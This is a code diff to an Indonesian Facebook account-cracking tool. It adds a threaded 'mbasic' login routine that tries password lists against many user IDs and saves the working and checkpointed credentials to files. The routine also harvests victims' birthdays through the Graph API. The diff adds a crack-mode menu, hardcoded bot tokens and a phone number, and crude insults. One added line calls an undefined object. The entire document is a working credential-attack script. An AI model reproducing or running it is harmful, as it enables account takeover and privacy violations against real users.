@@ -108,6 +108,9 @@ inp = ("[-] ")
 bulat = ("[#] ")
 kiky_at = ("Mr.Risky")
 kiky_hp = ("+6283143565470")
+
+###### >>>> SETINGAN UNTUK LEN ATAU STR
+
 loop = 0
 ok = []
 cp = []
@@ -130,6 +133,9 @@ ubahP=[]
 pwBaru=[]
 mb = "https://mbasic.facebook.com"
 color = lambda col: "\x1b[1;"+str(col)+"m"
+
+###### >>>> SETINGAN JAM ATAU TANGGAL
+
 durasi = str(datetime.now().strftime("%d-%m-%Y"))
 tahun = current.year
 bulan = current.month
@@ -138,6 +144,10 @@ current = datetime.now()
 waktuu = str(datetime.now().strftime("%Y-%m-%d"))
 waktu = str(datetime.now().strftime("%Y%m%d"))
 jamz = datetime.now().strftime('%H:%M:%S')
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
+
+###### >>>> SETINGAN TOKEN CRACK BAPI DAN MBASIC
+
 #waktu = ("%s%s%s"%(tahun,bulan,hari))
 TOOKKUKIS = ("2107717763:AAG6xvFgYP6nQnnK0QM2eKoUi4gZ-MdVu7c")
 TOOK = ("2141841952:AAG6cVAUG2YHDYspoh5l8qvW2VXfI-x-FvA")
@@ -1105,6 +1115,56 @@ def log_mbasic(em,pas,hosts):
     elif "checkpoint" in list(r.cookies.get_dict().keys()):
         return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
     else:return {"status":"error","email":em,"pass":pas}
+def mbasic(uid, jmbf):
+	global ok, cp, loop, ua
+	sys.stdout.write(
+		"\r%s[%s%s%s]%s Die : %s OK:%s - CP:%s "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,Q,loop, len(ok), len(cp))
+	); sys.stdout.flush()
+	for pw in jmbf:
+		kwargs = {}
+		pw = pw.lower()
+		ses = requests.Session()
+		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
+		b = parser(p,"html.parser")
+		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+		for i in b("input"):
+			try:
+				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+				else:continue
+			except:pass
+		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
+		if "c_user" in ses.cookies.get_dict().keys():
+			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
+			print("\r%s[%sOK%s]%s %s|%s | %s       "%(Q,I,Q,I,uid, pw, send.json()["access_token"]))
+			ok.append("%s|%s"%(uid, pw))
+			open("Hasil/OK-"+durasi+".txt","a").write("%s|%s\n"%(uid, pw))
+			break
+		elif "checkpoint" in ses.cookies.get_dict().keys():
+			try:
+				token = open("login.txt", "r").read()
+				with requests.Session() as ses:
+					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+					month, day, year = ttl.split("/")
+					month = bulan_ttl[month]
+					print(f"\r{Q}[{K}{datetime.now().strftime('%H:%M:%S')}{Q}]{K} {uid}|{pw}|{day} {month} {year}{Q}           ")
+					cp.append("%s|%s"%(uid, pw))
+					open("Hasil/CP-"+durasi+".txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
+					break
+			except (KeyError, IOError):
+				day = (" ")
+				month = (" ")
+				year = (" ")
+			except:pass
+			print("\r%s[%s%s%s]%s %s|%s        "%(Q,K,datetime.now().strftime('%H:%M:%S'),Q,K,uid, pw))
+			cp.append("%s|%s"%(uid, pw))
+			open("Hasil/CP-"+durasi+".txt","a").write("%s|%s\n"%(uid, pw))
+			break
+		else:
+			continue
+
+	loop += 1
 class crackmenu:
 
     def __init__(self,isifile):
@@ -1117,7 +1177,6 @@ class crackmenu:
             print(war+'File Not Found! Try Again')
             time.sleep(2)
             menu()
-        pilih_pw()
 #        buat_gab()
 #        tanya_opsi()
         print('\n\n'+war+'Apakah Anda Mau Menggunakan Password Manual (y/n) ?')
@@ -1144,8 +1203,25 @@ class crackmenu:
                     zkth(pwx.split(','))
                     break
         elif zk in ('n', 'N'):
-                jalan("\n\n"+war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+war+"Hasil Crack Yang OK DiSimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n\n")
-                self.KangCilok()
+                pilih_pw()
+                jalan("\n"+war+"Silahkan Pilih Metode Login !")
+                print(Q+"[1] B-Api ( Cepat Crack ) ( Rawan Spam )")
+                print(Q+"[2] Mbasic ( Slow )\n")
+                jm = input(war+"Pilih :")
+                if jm == "":
+                   jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
+                   crackmenu().passmenu()
+                elif jm == "1" or jm == "01":
+                   print("\n\n"+war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+war+"Hasil Crack Yang OK DiSimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n\n")
+                   self.KangCilok()
+                   
+                elif jm == "2" or jm == "02":
+                   print("\n\n"+war+"Hidup Matikan Mode Pesawat Jika Tidak Ada Hasil\n"+war+"Hasil Crack Yang CP DiSimpan Di : "+K+"Hasil/CP-"+durasi+".txt\n"+war+"Hasil Crack Yang OK DiSimpan Di : "+I+"Hasil/OK-"+durasi+".txt\n\n")
+                   self.KangBOKEP()
+
+                else:
+                   jalan(war+"Isi Dengan Benar Lah Kentot");time.sleep(1)
+                   crackmenu().passmenu()
         else:
             print(war+'Isi Dengan Benar !')
             time.sleep(2)
@@ -1215,7 +1291,17 @@ class crackmenu:
                         form.submit(self.api,zz[0], generate(zz[1]))
                     except:
                         pass
- #           os.remove(self.apk)
+            os.remove(self.apk)
+            exit("\n\n"+war+"Crack Selesai")
+    def KangBOKEP(self):
+            with zthreads(max_workers=35) as (form):
+            	for uname in self.id:
+                    try:
+                        zz = uname.split('<=>')
+                        form.submit(mbasic,zz[0], generate(zz[1]))
+                    except:
+                        pass
+            os.remove(self.apk)
             exit("\n\n"+war+"Crack Selesai")
 
 
